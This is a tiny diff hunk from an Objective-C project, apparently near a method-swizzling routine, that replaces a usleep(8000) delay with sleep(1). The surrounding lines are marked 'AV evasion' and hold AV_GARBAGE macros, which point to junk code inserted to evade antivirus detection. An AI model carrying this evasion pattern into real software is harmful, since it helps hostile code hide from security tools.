@@ -1876,7 +1876,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     // AV evasion: only on release build
     AV_GARBAGE_003 
 
-    usleep(8000);
+    sleep(1);
     
     // AV evasion: only on release build
     AV_GARBAGE_005 
